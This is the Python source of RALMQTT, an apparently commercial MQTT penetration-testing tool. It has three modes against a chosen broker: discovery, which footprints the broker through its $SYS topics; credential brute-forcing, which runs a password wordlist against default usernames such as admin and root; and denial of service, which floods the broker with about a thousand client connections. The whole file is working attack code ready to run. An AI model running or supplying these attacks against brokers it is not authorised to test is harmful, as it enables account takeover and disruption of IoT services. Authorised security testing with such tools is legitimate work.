import sys
import time
import subprocess
from tqdm import tqdm
import paho.mqtt.client as mqtt

asciiart ="""
--------------------------------------------------------------------------
  _____            _      __  __  ____ _______ _______
 |  __ \\     /\\   | |    |  \\/  |/ __ \\__   __|__   __|
 | |__) |   /  \\  | |    | \\  / | |  | | | |     | |
 |  _  /   / /\\ \\ | |    | |\\/| | |  | | | |     | |
 | | \\ \\  / ____ \\| |____| |  | | |__| | | |     | |
 |_|  \\_\\/_/    \\_\\______|_|  |_|\\___\\_\\ |_|     |_|


Made by eddym@lou // https://www.redalertlabs.com
Your IoT Cybersecurity Trusted Partner
Bringing Trust to the Internet of Things
RALMQTT is a python based tool designed for MQTT pentesting

--------------------------------------------------------------------------
"""

bruteforce_mode = False
topic_accessible = False
print_message = True
sys_topic_info = {
    "Broker_Version": "Not acquired",
    "Uptime": "Not acquired",
    "Connected_clients": "Not acquired",
    "Received_Messages_1_Minute": "Not acquired"
}

def print_help():
    print("Usage: python3 ralmqtt.py -m <attack mode> -a <addr> [-P <port>] [-p <password>] [-u <user>]")
    print("Options:")
    print("-m, --mode       Mode (choose from : discovery/dos/bruteforce)")
    print("-a, --addr       Broker's address")
    print("-P, --port       Broker's port (default value being 1883)")
    print("-p, --password   Broker's password (optional)")
    print("-u, --user       Broker's username (optional)")
    print("-w, --wordlist   Password wordlist for bruteforce mode (default ./passwords.txt)")
    sys.exit(0)

def parse_arguments():
    valid_modes = ['discovery', 'dos', 'bruteforce']
    args = {'-P': 1883, '-w': "passwords.txt"}  

    i = 1
    while i < len(sys.argv):
        if sys.argv[i] in ['-m', '--mode']:
            if i + 1 < len(sys.argv):
                mode = sys.argv[i + 1]
                if mode in valid_modes:
                    args[sys.argv[i]] = mode
                    i += 2
                else:
                    print("Error : invalid mode. Mode must be one of the followings :", ', '.join(valid_modes))
                    print_help()
            else:
                print("Error : missing argument value for", sys.argv[i])
                print_help()
        elif sys.argv[i] in ['-P', '--port']:
            if i + 1 < len(sys.argv):
                port = sys.argv[i + 1]
                if port.isdigit():
                    args[sys.argv[i]] = int(port)
                    i += 2
                else:
                    print("Error : port must be an integer")
                    print_help()
            else:
                print("Error : missing argument value for", sys.argv[i])
                print_help()
        elif sys.argv[i] in ['-a', '--addr', '-p', '--password', '-u', '--user', '-w', '--wordlist']:
            if i + 1 < len(sys.argv):
                args[sys.argv[i]] = sys.argv[i + 1]
                i += 2
            else:
                print("Error : missing argument value for", sys.argv[i])
                print_help()
        else:
            print("Error : invalid argument", sys.argv[i])
            print_help()

    return args

def on_connect(client, userdata, flags, rc):
    global bruteforce_mode
    if rc == 0:
        client.connected_flag = True
        print("No authentication mechanism is implemented or valid credentials : successfully connected")
    elif rc == 3:
        print("Connection refused, server unavailable")
    elif rc == 5:
        if bruteforce_mode == False:
            print("The broker requires an authentication (-> user + password)")
    elif rc == 4:
        if bruteforce_mode == False:
            print("Invalid credentials, connection refused")


def on_message(client, userdata, msg):
    global topic_accessible
    global print_message
    global sys_topic_info
    topic_accessible = True
    
    if print_message:
        print("Received message on topic" + msg.topic + " : " + str(msg.payload))
        
    if msg.topic.startswith("$SYS/broker/version"):
        sys_topic_info["Broker_Version"] = msg.payload.decode()
        
    if msg.topic.startswith("$SYS/broker/uptime"):
        sys_topic_info["Uptime"] = msg.payload.decode()
        
    if msg.topic.startswith("$SYS/broker/clients/connected"):
        sys_topic_info["Connected_clients"] = msg.payload.decode()
    
    if msg.topic.startswith("$SYS/broker/load/messages/received/1min"):
        sys_topic_info["Received_Messages_1_Minute"] = msg.payload.decode()
        
                
def dos(bk_addr, bk_port, bk_user, bk_pass):
    try:
        fake_clients = []  

        print('\Creating requests...\n')

        for i in tqdm(range(1020)):
            client = mqtt.Client(f'client{i}')  
            if bk_user and bk_pass:
                client.username_pw_set(bk_user, bk_pass)  
            fake_clients.append(client)  
            fake_clients[i - 1].connect(bk_addr, bk_port, 60)  

        print('\nRequests sent !\n')

        end = input('[ Press any key to stop the attack ]\n')
        print('[ Attack stopped ]\n')

    except KeyboardInterrupt:
        subprocess.call('clear', shell=True)
        print('Error : unexpected attack stop')
        

def bruteforce(bk_addr, bk_port, bk_user, bk_pass, wordlist):
    global bruteforce_mode 
    bruteforce_mode = True
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    client.connected_flag = False  

    default_users = ["admin", "root", "mosquitto", "user", "broker", "mqtt"]
    
    if bk_user:
        default_users.insert(0, bk_user)  
    
    try:
        with open(wordlist, encoding="utf-8", errors="ignore") as wd:
            passwords = wd.read().splitlines() 
    except Exception as e:  
        print("An error occurred while opening the file:", e)
        return 
         
    print("Loaded " + str(len(passwords)) + " passwords from " + wordlist)  

    passwords = [password for password in passwords if password]

    for user in default_users:
        if user is None:
            continue
        for password in tqdm(passwords, desc=f'Trying user {user}'):
            client.username_pw_set(user, password)
            client.connect(bk_addr, bk_port, 60)
            client.loop_start()
            client.loop_stop() 
            if client.connected_flag:
                print("Successfully connected with credentials:", str(user), "/", str(password))
                return 
        client.disconnect()

def discovery(bk_addr, bk_port, bk_user, bk_pass):
    global topic_accessible
    global print_message
    global sys_topic_info
    
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    if bk_user != "" and bk_pass != "":
        client.username_pw_set(bk_user, bk_pass)
    try:
        client.connect(bk_addr, bk_port, 60)
        time.sleep(1)
        client.loop_start()
        time.sleep(1)    
        
        print("Subscribing to the $SYS/# topic hierarchy for footprinting...")
        print_message = False
        client.subscribe("$SYS/#")
        

        timeout = 3
        start_time = time.time()
        while time.time() - start_time < timeout:
            if topic_accessible:
                break  
            time.sleep(1) 
            
        if topic_accessible:
            print("Messages received on $SYS/# topics. The topic is accessible. \n")
            for key in sys_topic_info:
                print("-" + key + " : " + sys_topic_info[key] + "\n")
        else:
            print("No messages received on $SYS/# topics within the timeout period.")
               
    except Exception as e:  
        print("Error connecting to the broker:", e)
    
    client.disconnect() 
 
def main():
    print(asciiart)
    
    args = parse_arguments()

    broker_addr = args.get('-a')
    broker_port = args.get('-P')
    broker_password = args.get('-p')
    broker_user = args.get('-u')
    attack_mode = args.get('-m')
    wordlist = args.get('-w')
    if len(args) <= 2:
        print_help()
    else:
        print("Broker Address:", broker_addr)
        print("Broker Port:", broker_port)
        print("Broker Password:", broker_password)
        print("Broker User:", broker_user)
        print("Attack Mode:", attack_mode)
    
    
    if attack_mode == "discovery":
        print("[!] Entering discovery mode [!]")
        discovery(broker_addr, broker_port, broker_user, broker_password)
    elif attack_mode == "bruteforce":
        print("[!] Entering bruteforce mode [!]")
        bruteforce(broker_addr, broker_port, broker_user, broker_password, wordlist)
    elif attack_mode == "dos":
        print("[!] Entering DoS mode [!]")
        dos(broker_addr, broker_port, broker_user, broker_password)
            

if __name__ == '__main__':
    main()

